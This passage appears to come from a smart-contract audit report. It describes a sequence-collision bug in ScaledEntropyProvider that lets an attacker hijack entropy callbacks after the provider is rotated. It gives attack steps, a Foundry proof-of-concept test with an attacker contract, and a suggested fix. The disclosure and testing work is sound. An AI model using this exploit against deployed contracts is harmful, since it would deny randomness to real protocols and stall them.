    for (uint256 i = 0; i < _setRequests.length; i++) {
        pending[sequence].setRequests.push(_setRequests[i]); // appends; no clear
    }
}

function entropyCallback(uint64 sequence, address /*provider*/, bytes32 randomNumber) internal override {
    PendingRequest memory req = pending[sequence];   // looks up by sequence only; ignores provider
    ...
}

## Impact
After the owner rotates the entropy provider while there are still pending requests for the old provider, a permissionless caller can issue a new request on the new provider with a colliding sequence number. Because pending requests are keyed only by sequence and the provider parameter is ignored during callback, the new request overwrites the old pending entry’s callback/selector and appends to its setRequests. When the Entropy contract later calls back for the old provider and that same sequence, ScaledEntropyProvider will deliver the randomness to the attacker’s callback (or at least not to the original consumer), leaving the legitimate consumer (e.g., Jackpot) without entropy and stuck. This enables reliable, low-cost DoS of entropy delivery and can stall protocol operations, but does not directly steal funds.

## Command to Run Test


## Proof of Concept
1) Assume a pending request exists for provider0 with sequence s.
2) Owner rotates the configured entropy provider to provider1.
3) Attacker repeatedly calls requestAndCallbackScaledRandomness on the new provider until the returned sequence equals s (often immediately for s=1 after rotation).
4) Because pending is keyed only by sequence, _storePendingRequest overwrites pending[s].callback/selector and appends its own SetRequest to the existing array.
5) When Entropy later invokes _entropyCallback(s, provider0, random), ScaledEntropyProvider ignores provider, loads pending[s], and calls the attacker’s callback instead of the original consumer. The original consumer never receives entropy and remains locked.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import { ScaledEntropyProvider } from "contracts/ScaledEntropyProvider.sol";
import { IScaledEntropyProvider } from "contracts/interfaces/IScaledEntropyProvider.sol";

contract EntropyMock {
    mapping(address => uint64) public seq;

    function getFeeV2(address /*provider*/, uint32 /*gasLimit*/) external pure returns (uint128) {
        return 1;
    }

    function requestV2(address provider, uint32 /*gasLimit*/) external payable returns (uint64) {
        require(msg.value >= 1, "fee");
        seq[provider] += 1;
        return seq[provider];
    }
}

contract JackpotMock {
    bool public gotCalled;
    uint256 public len;

    function onEntropy(uint64 /*seq*/, uint256[][] memory rnd, bytes memory /*ctx*/) external {
        gotCalled = true;
        len = rnd.length;
    }
}

contract AttackConsumer {
    bool public gotCalled;
    uint256 public lastLen;

    function hackedCallback(uint64 /*seq*/, uint256[][] memory rnd, bytes memory /*ctx*/) external {
        gotCalled = true;
        lastLen = rnd.length;
    }
}

contract SequenceCollisionHijackTest is Test {
    EntropyMock entropy;
    ScaledEntropyProvider sep;
    address provider0 = address(0x1000);
    address provider1 = address(0x2000);

    JackpotMock jackpot;
    AttackConsumer attacker;

    function setUp() public {
        entropy = new EntropyMock();
        sep = new ScaledEntropyProvider(address(entropy), provider0);
        jackpot = new JackpotMock();
        attacker = new AttackConsumer();
    }

    function test_provider_switch_sequence_collision_hijacks_callback() public {
        // Original consumer makes a request on old provider (sequence expected = 1)
        IScaledEntropyProvider.SetRequest[] memory reqA = new IScaledEntropyProvider.SetRequest[](2);
        reqA[0] = IScaledEntropyProvider.SetRequest({samples: 5, minRange: 1, maxRange: 10, withReplacement: false});
        reqA[1] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 10, withReplacement: true});

        vm.prank(address(jackpot));
        uint64 s0 = sep.requestAndCallbackScaledRandomness{value: 1}(100_000, reqA, JackpotMock.onEntropy.selector, "");
        assertEq(s0, 1, "old provider seq should be 1");

        // Owner rotates provider (normal operation)
        sep.setEntropyProvider(provider1);

        // Attacker creates a request on new provider; first new seq = 1 (collision)
        IScaledEntropyProvider.SetRequest[] memory reqB = new IScaledEntropyProvider.SetRequest[](1);
        reqB[0] = IScaledEntropyProvider.SetRequest({samples: 1, minRange: 1, maxRange: 2, withReplacement: true});

        vm.prank(address(attacker));
        uint64 s1 = sep.requestAndCallbackScaledRandomness{value: 1}(100_000, reqB, AttackConsumer.hackedCallback.selector, "");
        assertEq(s1, s0, "sequence collision across providers");

        // Validate overwrite without referencing internal types by destructuring the returned struct
        (
            address cb,
            ,
            ,
            ,
            IScaledEntropyProvider.SetRequest[] memory sets
        ) = sep.getPendingRequest(s0);
        assertEq(cb, address(attacker), "callback overwritten by attacker");
        assertEq(sets.length, 3, "setRequests length appended (old+new)");

        // Entropy callback for OLD provider s0 delivers to attacker, not to jackpot (DoS/hijack)
        vm.prank(address(entropy));
        sep._entropyCallback(s0, provider0, bytes32(uint256(123)));

        assertTrue(attacker.gotCalled(), "attacker must be called");
        assertFalse(jackpot.gotCalled(), "jackpot should not be called");
    }
}


## Suggested Mitigation
- Key pending requests by both provider and sequence, and validate the provider on callback:
  • Use mapping(bytes32 => PendingRequest) pending; with key = keccak256(abi.encodePacked(provider, sequence)).
  • Store the provider alongside the request or derive from the key; in entropyCallback require that the passed provider matches the key used to lookup the pending request.
- Before writing a new pending entry for a key, clear any existing storage to avoid array remnants (delete pending[key]) and then push the new setRequests.
- Do not rely on sequence alone across provider rotations; alternatively maintain a monotonically increasing local nonce and include it in the key to guarantee uniqueness.



